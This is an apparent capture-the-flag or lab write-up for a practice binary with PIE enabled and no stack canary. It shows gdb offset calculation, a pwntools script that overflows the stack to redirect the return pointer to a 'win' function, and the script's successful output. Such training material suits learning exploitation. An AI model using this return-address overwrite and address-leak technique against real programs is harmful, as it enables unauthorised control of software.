# 06_ret_overwrite_pie_noCanary Writeup

## Steps:
1. Run chall. Notice in this one PIE is enabled. This means that thememory locations are not fixed
```
$ ./chall 

Your goal is to modify the return pointer @ 0x7ffd89d06a78, to a function called 'win' in the binary.

The next protection you will learn, is position-independent code (PIC) or more often position-independent executable (PIE)
Previoiously the base address of the binaries was 0x40000. This time this address will look something like '0x558b5e6ff000'.
This is bypassed by leaking an address, determining the base address from the leak, and then determining any addresses to code
from their offsets. If you are confused by any of this, do some research to better understand it!

Like last time, we will start with a hint @ 0x563032966010

0x7ffd89d06a50: 0x0000000000000000 0x0000000000000000 
0x7ffd89d06a60: 0xffffffffffffffff 0xffffffffffffffff 
0x7ffd89d06a70: 0x0000000000000001 0x00007f558da5fca8 

Enter input: AAAA

0x7ffd89d06a50: 0x0000000a41414141 0x0000000000000000 
0x7ffd89d06a60: 0xffffffffffffffff 0xffffffffffffffff 
0x7ffd89d06a70: 0x0000000000000001 0x00007f558da5fca8 

You failed to overwrite the return pointer.
```
2. Using gdb gef, notice that every time we run it the hint is at the same location. This means we can use gdb to get the relative distance between the `hint` and `win`
- `info function win` gives us `0x00005555555555d9  win`
- `hint` is at `0x555555558010`

    So `0x8010 - 0x55d9 = 0x2a37`

3. Recieve the `hint` and subtract `0x2a37` to calculate the address of `win`
4. Create the payload, similar to previous problems
- 40 bytes of garbage to reach return pointer
- address of `win`
```
from pwn import *

target = process("./chall")

target.recvuntil("hint @ 0x")
hint = target.recvuntil("\n")
print(hint)

win = int(hint, 16) - 0x2A37


payload = b"A" * 8 * 5
payload += p64(win)

target.sendline(payload)

s = target.recvall().decode()
print(s)
```

## Solution:
```
$ python3 exploit.py 
[+] Starting local process './chall': pid 73075
/home/kali/Binex-Writeups/binex_tuts/06_ret_overwrite_pie_noCanary/exploit.py:5: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  target.recvuntil("hint @ 0x")
/home/kali/Binex-Writeups/binex_tuts/06_ret_overwrite_pie_noCanary/exploit.py:6: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  hint = target.recvuntil("\n")
b'5582bf85b010\n'
[+] Receiving all data: Done (524B)
[*] Process './chall' stopped with exit code 0 (pid 73075)

0x7ffd8bc108a0: 0x0000000000000000 0x0000000000000000 
0x7ffd8bc108b0: 0xffffffffffffffff 0xffffffffffffffff 
0x7ffd8bc108c0: 0x0000000000000001 0x00007f1ddbe01ca8 

Enter input: 
0x7ffd8bc108a0: 0x4141414141414141 0x4141414141414141 
0x7ffd8bc108b0: 0x4141414141414141 0x4141414141414141 
0x7ffd8bc108c0: 0x4141414141414141 0x00005582bf8585d9 

Congrats, you successuly changed execution flow!
```
